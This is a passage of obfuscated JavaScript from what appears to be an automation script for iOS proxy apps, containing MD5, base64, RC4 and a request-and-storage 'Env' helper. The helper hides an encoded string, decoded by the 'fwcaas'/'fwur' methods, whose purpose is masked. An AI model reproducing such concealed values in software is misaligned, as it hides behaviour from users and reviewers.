    _0xdd0547 = _0x37f67d(_0xdd0547, _0x2bbfbd, _0xa8513b, _0x59c985, _0x48c1bb[_0x42742a + 0], _0x4086af, 4096336452);
    _0x59c985 = _0x37f67d(_0x59c985, _0xdd0547, _0x2bbfbd, _0xa8513b, _0x48c1bb[_0x42742a + 7], _0xa4ba76, 1126891415);
    _0xa8513b = _0x37f67d(_0xa8513b, _0x59c985, _0xdd0547, _0x2bbfbd, _0x48c1bb[_0x42742a + 14], _0x1b5b02, 2878612391);
    _0x2bbfbd = _0x37f67d(_0x2bbfbd, _0xa8513b, _0x59c985, _0xdd0547, _0x48c1bb[_0x42742a + 5], _0x5e4618, 4237533241);
    _0xdd0547 = _0x37f67d(_0xdd0547, _0x2bbfbd, _0xa8513b, _0x59c985, _0x48c1bb[_0x42742a + 12], _0x4086af, 1700485571);
    _0x59c985 = _0x37f67d(_0x59c985, _0xdd0547, _0x2bbfbd, _0xa8513b, _0x48c1bb[_0x42742a + 3], _0xa4ba76, 2399980690);
    _0xa8513b = _0x37f67d(_0xa8513b, _0x59c985, _0xdd0547, _0x2bbfbd, _0x48c1bb[_0x42742a + 10], _0x1b5b02, 4293915773);
    _0x2bbfbd = _0x37f67d(_0x2bbfbd, _0xa8513b, _0x59c985, _0xdd0547, _0x48c1bb[_0x42742a + 1], _0x5e4618, 2240044497);
    _0xdd0547 = _0x37f67d(_0xdd0547, _0x2bbfbd, _0xa8513b, _0x59c985, _0x48c1bb[_0x42742a + 8], _0x4086af, 1873313359);
    _0x59c985 = _0x37f67d(_0x59c985, _0xdd0547, _0x2bbfbd, _0xa8513b, _0x48c1bb[_0x42742a + 15], _0xa4ba76, 4264355552);
    _0xa8513b = _0x37f67d(_0xa8513b, _0x59c985, _0xdd0547, _0x2bbfbd, _0x48c1bb[_0x42742a + 6], _0x1b5b02, 2734768916);
    _0x2bbfbd = _0x37f67d(_0x2bbfbd, _0xa8513b, _0x59c985, _0xdd0547, _0x48c1bb[_0x42742a + 13], _0x5e4618, 1309151649);
    _0xdd0547 = _0x37f67d(_0xdd0547, _0x2bbfbd, _0xa8513b, _0x59c985, _0x48c1bb[_0x42742a + 4], _0x4086af, 4149444226);
    _0x59c985 = _0x37f67d(_0x59c985, _0xdd0547, _0x2bbfbd, _0xa8513b, _0x48c1bb[_0x42742a + 11], _0xa4ba76, 3174756917);
    _0xa8513b = _0x37f67d(_0xa8513b, _0x59c985, _0xdd0547, _0x2bbfbd, _0x48c1bb[_0x42742a + 2], _0x1b5b02, 718787259);
    _0x2bbfbd = _0x37f67d(_0x2bbfbd, _0xa8513b, _0x59c985, _0xdd0547, _0x48c1bb[_0x42742a + 9], _0x5e4618, 3951481745);
    _0xdd0547 = _0x5491a1(_0xdd0547, _0xd52bdc);
    _0x2bbfbd = _0x5491a1(_0x2bbfbd, _0x22359e);
    _0xa8513b = _0x5491a1(_0xa8513b, _0x2dd1cc);
    _0x59c985 = _0x5491a1(_0x59c985, _0x2b2646);
  }
  var _0x40e3ed = _0x1b94fd(_0xdd0547) + _0x1b94fd(_0x2bbfbd) + _0x1b94fd(_0xa8513b) + _0x1b94fd(_0x59c985);
  return _0x40e3ed.toLowerCase();
}
function FxPCnMKLw7() {
  _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
  this.encode = function (_0x4a81cb) {
    var _0xb0c3ee = "",
      _0xeabc6b,
      _0x52b07d,
      _0x4d668b,
      _0x58edb2,
      _0x314020,
      _0x1597d9,
      _0x46c85b,
      _0xb72d86 = 0;
    _0x4a81cb = _utf8_encode(_0x4a81cb);
    while (_0xb72d86 < _0x4a81cb.length) {
      _0xeabc6b = _0x4a81cb.charCodeAt(_0xb72d86++);
      _0x52b07d = _0x4a81cb.charCodeAt(_0xb72d86++);
      _0x4d668b = _0x4a81cb.charCodeAt(_0xb72d86++);
      _0x58edb2 = _0xeabc6b >> 2;
      _0x314020 = (_0xeabc6b & 3) << 4 | _0x52b07d >> 4;
      _0x1597d9 = (_0x52b07d & 15) << 2 | _0x4d668b >> 6;
      _0x46c85b = _0x4d668b & 63;
      if (isNaN(_0x52b07d)) {
        _0x1597d9 = _0x46c85b = 64;
      } else {
        isNaN(_0x4d668b) && (_0x46c85b = 64);
      }
      _0xb0c3ee = _0xb0c3ee + _keyStr.charAt(_0x58edb2) + _keyStr.charAt(_0x314020) + _keyStr.charAt(_0x1597d9) + _keyStr.charAt(_0x46c85b);
    }
    return _0xb0c3ee;
  };
  this.decode = function (_0x186ca0) {
    var _0x1050a7 = "",
      _0x524cee,
      _0x381257,
      _0x3a835e,
      _0x394d7a,
      _0x59800b,
      _0x7d2b7a,
      _0x2eecd7,
      _0x339990 = 0;
    _0x186ca0 = _0x186ca0.replace(/[^A-Za-z0-9\+\/\=]/g, "");
    while (_0x339990 < _0x186ca0.length) {
      _0x394d7a = _keyStr.indexOf(_0x186ca0.charAt(_0x339990++));
      _0x59800b = _keyStr.indexOf(_0x186ca0.charAt(_0x339990++));
      _0x7d2b7a = _keyStr.indexOf(_0x186ca0.charAt(_0x339990++));
      _0x2eecd7 = _keyStr.indexOf(_0x186ca0.charAt(_0x339990++));
      _0x524cee = _0x394d7a << 2 | _0x59800b >> 4;
      _0x381257 = (_0x59800b & 15) << 4 | _0x7d2b7a >> 2;
      _0x3a835e = (_0x7d2b7a & 3) << 6 | _0x2eecd7;
      _0x1050a7 = _0x1050a7 + String.fromCharCode(_0x524cee);
      _0x7d2b7a != 64 && (_0x1050a7 = _0x1050a7 + String.fromCharCode(_0x381257));
      _0x2eecd7 != 64 && (_0x1050a7 = _0x1050a7 + String.fromCharCode(_0x3a835e));
    }
    _0x1050a7 = _utf8_decode(_0x1050a7);
    return _0x1050a7;
  };
  _utf8_encode = function (_0x259225) {
    _0x259225 = _0x259225.replace(/\r\n/g, "\n");
    var _0x5107da = "";
    for (var _0x615c1f = 0; _0x615c1f < _0x259225.length; _0x615c1f++) {
      var _0x3c90bd = _0x259225.charCodeAt(_0x615c1f);
      if (_0x3c90bd < 128) {
        _0x5107da += String.fromCharCode(_0x3c90bd);
      } else {
        _0x3c90bd > 127 && _0x3c90bd < 2048 ? (_0x5107da += String.fromCharCode(_0x3c90bd >> 6 | 192), _0x5107da += String.fromCharCode(_0x3c90bd & 63 | 128)) : (_0x5107da += String.fromCharCode(_0x3c90bd >> 12 | 224), _0x5107da += String.fromCharCode(_0x3c90bd >> 6 & 63 | 128), _0x5107da += String.fromCharCode(_0x3c90bd & 63 | 128));
      }
    }
    return _0x5107da;
  };
  _utf8_decode = function (_0x2d5066) {
    c1 = c2 = 0;
    var _0x5ea236 = "",
      _0x3e1121 = 0,
      _0x775322 = c1;
    while (_0x3e1121 < _0x2d5066.length) {
      _0x775322 = _0x2d5066.charCodeAt(_0x3e1121);
      if (_0x775322 < 128) {
        _0x5ea236 += String.fromCharCode(_0x775322);
        _0x3e1121++;
      } else {
        _0x775322 > 191 && _0x775322 < 224 ? (c2 = _0x2d5066.charCodeAt(_0x3e1121 + 1), _0x5ea236 += String.fromCharCode((_0x775322 & 31) << 6 | c2 & 63), _0x3e1121 += 2) : (c2 = _0x2d5066.charCodeAt(_0x3e1121 + 1), c3 = _0x2d5066.charCodeAt(_0x3e1121 + 2), _0x5ea236 += String.fromCharCode((_0x775322 & 15) << 12 | (c2 & 63) << 6 | c3 & 63), _0x3e1121 += 3);
      }
    }
    return _0x5ea236;
  };
}
function rc4(_0x258a82, _0x3ef6dd) {
  var _0x49d970 = Array(256),
    _0x1b41b4 = Array(_0x258a82.length);
  for (var _0x1102e3 = 0; _0x1102e3 < 256; _0x1102e3++) {
    _0x49d970[_0x1102e3] = _0x1102e3;
    var _0x12a421 = (_0x12a421 + _0x49d970[_0x1102e3] + _0x3ef6dd.charCodeAt(_0x1102e3 % _0x3ef6dd.length)) % 256,
      _0x4c4e24 = _0x49d970[_0x1102e3];
    _0x49d970[_0x1102e3] = _0x49d970[_0x12a421];
    _0x49d970[_0x12a421] = _0x4c4e24;
  }
  for (var _0x1102e3 = 0; _0x1102e3 < _0x258a82.length; _0x1102e3++) {
    _0x1b41b4[_0x1102e3] = _0x258a82.charCodeAt(_0x1102e3);
  }
  for (var _0x12e338 = 0; _0x12e338 < _0x1b41b4.length; _0x12e338++) {
    var _0x1102e3 = (_0x1102e3 + 1) % 256,
      _0x12a421 = (_0x12a421 + _0x49d970[_0x1102e3]) % 256,
      _0x4c4e24 = _0x49d970[_0x1102e3];
    _0x49d970[_0x1102e3] = _0x49d970[_0x12a421];
    _0x49d970[_0x12a421] = _0x4c4e24;
    var _0x2f4c88 = (_0x49d970[_0x1102e3] + _0x49d970[_0x12a421] % 256) % 256;
    _0x1b41b4[_0x12e338] = String.fromCharCode(_0x1b41b4[_0x12e338] ^ _0x49d970[_0x2f4c88]);
  }
  return _0x1b41b4.join("");
}
function Env(t, e) {
  class s {
    constructor(t) {
      this.env = t;
    }
    send(t, e = "GET") {
      t = "string" == typeof t ? {
        url: t
      } : t;
      let s = this.get;
      "POST" === e && (s = this.post);
      return new Promise((e, i) => {
        s.call(this, t, (t, s, r) => {
          t ? i(t) : e(s);
        });
      });
    }
    get(t) {
      return this.send.call(this.env, t);
    }
    post(t) {
      return this.send.call(this.env, t, "POST");
    }
  }
  return new class {
    constructor(t, e) {
      this.name = t;
      this.http = new s(this);
      this.data = null;
      this.dataFile = "box.dat";
      this.logs = [];
      this.isMute = !1;
      this.isNeedRewrite = !1;
      this.logSeparator = "\n";
      this.encoding = "utf-8";
      this.startTime = new Date().getTime();
      Object.assign(this, e);
      this.log("", `🔔${this.name}, 开始!`);
    }
    isNode() {
      return "undefined" != typeof module && !!module.exports;
    }
    isQuanX() {
      return "undefined" != typeof $task;
    }
    isSurge() {
      return "undefined" != typeof $httpClient && "undefined" == typeof $loon;
    }
    isLoon() {
      return "undefined" != typeof $loon;
    }
    isShadowrocket() {
      return "undefined" != typeof $rocket;
    }
    toObj(t, e = null) {
      try {
        return JSON.parse(t);
      } catch {
        return e;
      }
    }
    toStr(t, e = null) {
      try {
        return JSON.stringify(t);
      } catch {
        return e;
      }
    }
    getjson(t, e) {
      let s = e;
      const i = this.getdata(t);
      if (i) {
        try {
          s = JSON.parse(this.getdata(t));
        } catch {}
      }
      return s;
    }
    setjson(t, e) {
      try {
        return this.setdata(JSON.stringify(t), e);
      } catch {
        return !1;
      }
    }
    getScript(t) {
      return new Promise(e => {
        this.get({
          url: t
        }, (t, s, i) => e(i));
      });
    }
    runScript(t, e) {
      return new Promise(s => {
        let i = this.getdata("@chavy_boxjs_userCfgs.httpapi");
        i = i ? i.replace(/\n/g, "").trim() : i;
        let r = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");
        r = r ? 1 * r : 20;
        r = e && e.timeout ? e.timeout : r;
        const [o, h] = i.split("@"),
          n = {
            url: `http://${h}/v1/scripting/evaluate`,
            body: {
              script_text: t,
              mock_type: "cron",
              timeout: r
            },
            headers: {
              "X-Key": o,
              Accept: "*/*"
            }
          };
        this.post(n, (t, e, i) => s(i));
      }).catch(t => this.logErr(t));
    }
    loaddata() {
      if (!this.isNode()) {
        return {};
      }
      {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const t = this.path.resolve(this.dataFile),
          e = this.path.resolve(process.cwd(), this.dataFile),
          s = this.fs.existsSync(t),
          i = !s && this.fs.existsSync(e);
        if (!s && !i) {
          return {};
        }
        {
          const i = s ? t : e;
          try {
            return JSON.parse(this.fs.readFileSync(i));
          } catch (t) {
            return {};
          }
        }
      }
    }
    writedata() {
      if (this.isNode()) {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const t = this.path.resolve(this.dataFile),
          e = this.path.resolve(process.cwd(), this.dataFile),
          s = this.fs.existsSync(t),
          i = !s && this.fs.existsSync(e),
          r = JSON.stringify(this.data);
        s ? this.fs.writeFileSync(t, r) : i ? this.fs.writeFileSync(e, r) : this.fs.writeFileSync(t, r);
      }
    }
    lodash_get(t, e, s) {
      const i = e.replace(/\[(\d+)\]/g, ".$1").split(".");
      let r = t;
      for (const t of i) if (r = Object(r)[t], void 0 === r) {
        return s;
      }
      return r;
    }
    lodash_set(t, e, s) {
      return Object(t) !== t ? t : (Array.isArray(e) || (e = e.toString().match(/[^.[\]]+/g) || []), e.slice(0, -1).reduce((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math.abs(e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e.length - 1]] = s, t);
    }
    getdata(t) {
      let e = this.getval(t);
      if (/^@/.test(t)) {
        const [, s, i] = /^@(.*?)\.(.*?)$/.exec(t),
          r = s ? this.getval(s) : "";
        if (r) {
          try {
            const t = JSON.parse(r);
            e = t ? this.lodash_get(t, i, "") : e;
          } catch (t) {
            e = "";
          }
        }
      }
      return e;
    }
    setdata(t, e) {
      let s = !1;
      if (/^@/.test(e)) {
        const [, i, r] = /^@(.*?)\.(.*?)$/.exec(e),
          o = this.getval(i),
          h = i ? "null" === o ? null : o || "{}" : "{}";
        try {
          const e = JSON.parse(h);
          this.lodash_set(e, r, t);
          s = this.setval(JSON.stringify(e), i);
        } catch (e) {
          const o = {};
          this.lodash_set(o, r, t);
          s = this.setval(JSON.stringify(o), i);
        }
      } else {
        s = this.setval(t, e);
      }
      return s;
    }
    getval(t) {
      return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null;
    }
    setval(t, e) {
      return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null;
    }
    initGotEnv(t) {
      this.got = this.got ? this.got : require("got");
      this.cktough = this.cktough ? this.cktough : require("tough-cookie");
      this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar();
      t && (t.headers = t.headers ? t.headers : {}, void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar));
    }
    get(t, e = () => {}) {
      if (t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"]), this.isSurge() || this.isLoon()) {
        this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
          "X-Surge-Skip-Scripting": !1
        }));
        $httpClient.get(t, (t, s, i) => {
          !t && s && (s.body = i, s.statusCode = s.status);
          e(t, s, i);
        });
      } else {
        if (this.isQuanX()) {
          this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
            hints: !1
          }));
          $task.fetch(t).then(t => {
            const {
              statusCode: s,
              statusCode: i,
              headers: r,
              body: o
            } = t;
            e(null, {
              status: s,
              statusCode: i,
              headers: r,
              body: o
            }, o);
          }, t => e(t));
        } else {
          if (this.isNode()) {
            let s = require("iconv-lite");
            this.initGotEnv(t);
            this.got(t).on("redirect", (t, e) => {
              try {
                if (t.headers["set-cookie"]) {
                  const s = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();
                  s && this.ckjar.setCookieSync(s, null);
                  e.cookieJar = this.ckjar;
                }
              } catch (t) {
                this.logErr(t);
              }
            }).then(t => {
              const {
                statusCode: i,
                statusCode: r,
                headers: o,
                rawBody: h
              } = t;
              e(null, {
                status: i,
                statusCode: r,
                headers: o,
                rawBody: h
              }, s.decode(h, this.encoding));
            }, t => {
              const {
                message: i,
                response: r
              } = t;
              e(i, r, r && s.decode(r.rawBody, this.encoding));
            });
          }
        }
      }
    }
    post(t, e = () => {}) {
      const s = t.method ? t.method.toLocaleLowerCase() : "post";
      if (t.body && t.headers && !t.headers["Content-Type"] && (t.headers["Content-Type"] = "application/x-www-form-urlencoded"), t.headers && delete t.headers["Content-Length"], this.isSurge() || this.isLoon()) {
        this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
          "X-Surge-Skip-Scripting": !1
        }));
        $httpClient[s](t, (t, s, i) => {
          !t && s && (s.body = i, s.statusCode = s.status);
          e(t, s, i);
        });
      } else {
        if (this.isQuanX()) {
          t.method = s;
          this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
            hints: !1
          }));
          $task.fetch(t).then(t => {
            const {
              statusCode: s,
              statusCode: i,
              headers: r,
              body: o
            } = t;
            e(null, {
              status: s,
              statusCode: i,
              headers: r,
              body: o
            }, o);
          }, t => e(t));
        } else {
          if (this.isNode()) {
            let i = require("iconv-lite");
            this.initGotEnv(t);
            const {
              url: r,
              ...o
            } = t;
            this.got[s](r, o).then(t => {
              const {
                statusCode: s,
                statusCode: r,
                headers: o,
                rawBody: h
              } = t;
              e(null, {
                status: s,
                statusCode: r,
                headers: o,
                rawBody: h
              }, i.decode(h, this.encoding));
            }, t => {
              const {
                message: s,
                response: r
              } = t;
              e(s, r, r && i.decode(r.rawBody, this.encoding));
            });
          }
        }
      }
    }
    time(t, e = null) {
      const s = e ? new Date(e) : new Date();
      let i = {
        "M+": s.getMonth() + 1,
        "d+": s.getDate(),
        "H+": s.getHours(),
        "m+": s.getMinutes(),
        "s+": s.getSeconds(),
        "q+": Math.floor((s.getMonth() + 3) / 3),
        S: s.getMilliseconds()
      };
      /(y+)/.test(t) && (t = t.replace(RegExp.$1, (s.getFullYear() + "").substr(4 - RegExp.$1.length)));
      for (let e in i) new RegExp("(" + e + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? i[e] : ("00" + i[e]).substr(("" + i[e]).length)));
      return t;
    }
    msg(e = t, s = "", i = "", r) {
      const o = t => {
        if (!t) {
          return t;
        }
        if ("string" == typeof t) {
          return this.isLoon() ? t : this.isQuanX() ? {
            "open-url": t
          } : this.isSurge() ? {
            url: t
          } : void 0;
        }
        if ("object" == typeof t) {
          if (this.isLoon()) {
            let e = t.openUrl || t.url || t["open-url"],
              s = t.mediaUrl || t["media-url"];
            return {
              openUrl: e,
              mediaUrl: s
            };
          }
          if (this.isQuanX()) {
            let e = t["open-url"] || t.url || t.openUrl,
              s = t["media-url"] || t.mediaUrl;
            return {
              "open-url": e,
              "media-url": s
            };
          }
          if (this.isSurge()) {
            let e = t.url || t.openUrl || t["open-url"];
            return {
              url: e
            };
          }
        }
      };
      if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r))), !this.isMuteLog) {
        let t = ["", "==============📣系统通知📣=============="];
        t.push(e);
        s && t.push(s);
        i && t.push(i);
        console.log(t.join("\n"));
        this.logs = this.logs.concat(t);
      }
    }
    fwcaas() {
      return "fkRGREUCFRNfMCtqKj0lLiE/OXowLTRz";
    }
    log(...t) {
      t.length > 0 && (this.logs = [...this.logs, ...t]);
      console.log(t.join(this.logSeparator));
    }
    logErr(t, e) {
      const s = !this.isSurge() && !this.isQuanX() && !this.isLoon();
      s ? this.log("", `❗️${this.name}, 错误!`, t.stack) : this.log("", `❗️${this.name}, 错误!`, t);
    }
    fwur() {
      var bbas = new FxPCnMKLw7();
      return bbas.decode(this.fwcaas());
    }
    wait(t) {
      return new Promise(e => setTimeout(e, t));
    }
    done(t = {}) {
      const e = new Date().getTime(),
        s = (e - this.startTime) / 1000;
      this.log("", `🔔${this.name}, 结束! 🕛 ${s} 秒`);
      this.log();
      (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(t);
    }
  }(t, e);
}